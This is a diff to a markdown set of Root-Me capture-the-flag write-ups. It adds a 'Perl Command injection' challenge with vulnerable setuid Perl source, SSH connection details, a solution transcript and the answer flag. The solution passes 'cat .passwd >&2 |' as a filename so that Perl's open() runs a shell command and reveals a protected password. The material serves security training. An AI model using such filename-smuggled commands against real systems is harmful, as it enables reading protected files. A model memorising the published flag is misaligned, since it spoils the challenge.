@@ -10,7 +10,7 @@ Exploit environment weaknesses, configuration mistakes and vulnerability pattern
 4. [LaTeX - Input](#latex-input)
 5. [Powershell - Command Injection](#powershell-command-injection)
 6. [Bash - unquoted expression injection](#bash-unquoted-expression-injection)
-7. [Perl - Command injection](#perl-command-injection)
+7. [Perl - Command injection](#perl-command-injection) 🗸
 8. [Powershell - SecureString](#powershell-securestring)
 9. [Bash - cron](#bash-cron) 🗸
 10. [LaTeX - Command execution](#latex-command-execution)
@@ -632,26 +632,109 @@ Detail here
 
 ---
 
-## perl command injection
+## Perl Command injection
 
-- Author: name
-- X Points
+- Author: Tosh
+- Date: 11 August 2015
+- Points: 15
+- Level: 2
 
 ### Description
 
-Description Here
+Retrieve the password stored in .passwd.
 
-### Hints
 
-1. Hint 1
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~
+#!/usr/bin/perl
+     
+delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};
+$ENV{'PATH'}='/bin:/usr/bin';
+     
+use strict;
+use warnings;
+     
+main();
+     
+sub main {
+  my ($file, $line) = @_;
+     
+  menu();
+  prompt();
+     
+  while((my $file = <STDIN>)) {
+    chomp $file; 
+    process_file($file);
+    prompt();
+  }
+}
+     
+sub prompt {
+  local $| = 1;
+  print ">>> ";
+}
+sub menu {
+  print "*************************\n";
+  print "* Stat File Service    *\n";
+  print "*************************\n";
+}
+     
+sub check_read_access {
+  my $f = shift;
+  if(-f $f) {
+    my $filemode = (stat($f))[2];
+    return ($filemode & 4);
+  }
+  return 0;
+}
+     
+sub process_file {
+  my $file = shift;
+  my $line;
+  my ($line_count, $char_count, $word_count) = (0,0,0);
+     
+  $file =~ /(.+)/;
+  $file = $1;
+  if(!open(F, $file)) {
+    die "[-] Can't open $file: $!\n";
+  }
+     
+     
+  while(($line = <F>)) {
+    $line_count++;
+    $char_count += length $line;
+    $word_count += scalar(split/\W+/, $line);
+  }
+     
+  print "~~~ Statistics for \"$file\" ~~~\n";
+  print "Lines: $line_count\n";
+  print "Words: $word_count\n";
+  print "Chars: $char_count\n";
+  close F;
+}
+~~~
+
+</details>
+
+### Resources
+
+1. [sips.html](https://www.cgisecurity.com/lib/sips.html)
 
 ### Connection Details
 
-1. Detail 1
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port: 2222
+- SSH Access: ssh -p 2222 app-script-ch7@challenge02.root-me.org
+- app-script-ch7
+- app-script-ch7
 
 ### Attachments
 
-1. Attachment 1
+None
 
 ### Solutions
 
@@ -659,7 +742,32 @@ Description Here
 
 <summary markdown="span">Solution 1</summary>
 
-Detail here
+This is a simple challenge that can workaround the file permissions:
+ 
+~~~shell
+app-script-ch7@challenge02:~$ ls
+ch7.pl  setuid-wrapper  setuid-wrapper.c
+app-script-ch7@challenge02:~$ ./setuid-wrapper 
+*************************
+* Stat File Service    *
+*************************
+>>> cat .passwd
+[-] Can't open cat .passwd: No such file or directory
+app-script-ch7@challenge02:~$ ./setuid-wrapper 
+*************************
+* Stat File Service    *
+*************************
+>>> cat .passwd >&2 |
+PerlCanDoBetterThanYouThink
+~~~ Statistics for "cat .passwd >&2 |" ~~~
+Lines: 0
+Words: 0
+Chars: 0
+>>> 
+Use of uninitialized value $file in open at /challenge/app-script/ch7/ch7.pl line 55, <STDIN> line 2.
+Use of uninitialized value $file in concatenation (.) or string at /challenge/app-script/ch7/ch7.pl line 56, <STDIN> line 2.
+[-] Can't open : No such file or directory
+~~~
 
 </details>
 
@@ -670,7 +778,7 @@ Detail here
 <summary markdown="span">Answer</summary>
 
 ~~~
-
+PerlCanDoBetterThanYouThink
 ~~~
 
 </details>
